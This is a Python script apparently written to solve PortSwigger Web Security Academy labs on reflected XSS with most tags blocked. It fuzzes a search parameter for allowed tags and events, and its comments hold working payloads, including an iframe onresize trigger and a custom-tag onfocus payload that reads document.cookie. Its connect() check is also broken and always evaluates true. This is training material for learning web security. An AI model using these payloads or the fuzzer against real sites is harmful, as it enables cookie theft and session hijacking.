#!/usr/bin/python3

# Reflected XSS into HTML context with most tags and attributes blocked

import requests
import urllib.parse

def connect(url, injection):
    target = url + injection

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        }

    proxies = {
        'http' : '127.0.0.1:8080',
        }

    for i in open("payload.txt", "r"):
        i = i.rstrip('\n')
        encPayload = urllib.parse.quote(i)
        testUrl = target + encPayload
        r = requests.get(testUrl, proxies=proxies, headers=headers)
        if "Tag is not allowed" or "Attribute is not allowed" or "Not solved" in r.text:
            print(f'Testing for {i}', end="")
            print(r.text)
        else:
            print(f'[INFO] Found XSS Payload: {i}')
            break

def allowedTag(url, injection):
    target = url + injection

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        }

    proxies = {
        'http' : '127.0.0.1:8080',
        }

    for i in open("tag.txt", "r"):
        i = i.rstrip('\n')
        testUrl = target + "<" + i + ">"
        r = requests.get(testUrl, proxies=proxies, headers=headers)
        if "Tag is not allowed" in r.text:
            pass
        else:
            print(f'[INFO] Allowed tag: {i}', end="")
            #break
    return i

def allowedEvent(url, injection, tag):
    target = url + injection

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        }

    proxies = {
        'http' : '127.0.0.1:8080',
        }

    #for i in open("event.txt", "r"):
    for i in open("tag.txt", "r"):
        i = i.rstrip('\n')
        #testUrl = target + "<" + tag + "%20" + i + "=1>"
        testUrl = target + "<" + tag + "><" + i + ">"
        r = requests.get(testUrl, proxies=proxies, headers=headers)
        #print(r.text)
        if "Tag is not allowed" in r.text:
            pass
        elif "Event is not allowed" in r.text:
            pass
        else:
            print(f'[INFO] Allowed event: {i}', end="")
            #break
    return i


if __name__ == '__main__':
    url = "https://ac9a1f241ec9b695c01d471000fb0085.web-security-academy.net/"
    injection = "?search="
    
    #tag = allowedTag(url, injection)
    tag = "svg"
    event = allowedEvent(url, injection, tag)

    #print(urllib.parse.quote('"><' + tag + " " + event + "=print()>"))

    #connect(url, injection)


# XSS Labs
# -------------------------------------------------------------------------------------------------------------------------------------------
# <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'> 
#
# -------------------------------------------------------------------------------------------------------------------------------------------
# [3] Reflected XSS into HTML context with all tags blocked except custom ones
# <script>location = 'https://ac081f4d1fda91bec1dd414e00810097.web-security-academy.net/?search=%3Cbigb0ss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script> 
#
# -------------------------------------------------------------------------------------------------------------------------------------------
# [4] Reflected XSS with event handlers and href attributes blocked
#
# Allowed tags
# -------------------------------
# [INFO] Allowed tag: a
# [INFO] Allowed tag: animate
# [INFO] Allowed tag: image
# [INFO] Allowed tag: svg
# [INFO] Allowed tag: title
#
# Allowed "svg" tags
# -------------------------------

